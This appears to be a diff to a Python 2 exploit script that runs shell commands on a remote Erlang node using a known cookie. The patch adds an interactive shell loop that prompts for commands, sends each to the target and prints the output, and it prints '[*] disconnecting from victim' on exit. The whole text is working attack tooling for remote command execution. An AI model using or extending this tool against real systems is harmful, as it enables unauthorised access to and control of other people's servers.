@@ -19,7 +19,7 @@ parser = argparse.ArgumentParser(description='Execute shell command through Erla
 parser.add_argument('target', action='store', type=str, help='Erlang node address or FQDN')
 parser.add_argument('port', action='store', type=int, help='Erlang node TCP port')
 parser.add_argument('cookie', action='store', type=str, help='Erlang cookie')
-parser.add_argument('cmd', action='store', type=str, help='Shell command to execute')
+parser.add_argument('cmd', default=None, nargs='?', action='store', type=str, help='Shell command to execute, defaults to interactive shell')
 
 args = parser.parse_args()
 
@@ -143,9 +143,25 @@ def recv_reply(f):
   assert(len(answer) == 2)
   return answer[1]
 
-sock.sendall(send_cmd(name, args.cmd))
 
-reply = recv_reply(sock)
-sys.stdout.write(reply)
+if not args.cmd:
+  while True:
+    try:
+      cmd = raw_input('%s:%d $ ' % (args.target, args.port))
+    except EOFError:
+      print('')
+      break
 
+    sock.sendall(send_cmd(name, cmd))
+
+    reply = recv_reply(sock)
+    sys.stdout.write(reply)
+else:
+  sock.sendall(send_cmd(name, args.cmd))
+
+  reply = recv_reply(sock)
+  sys.stdout.write(reply)
+
+
+print('[*] disconnecting from victim')
 sock.close()
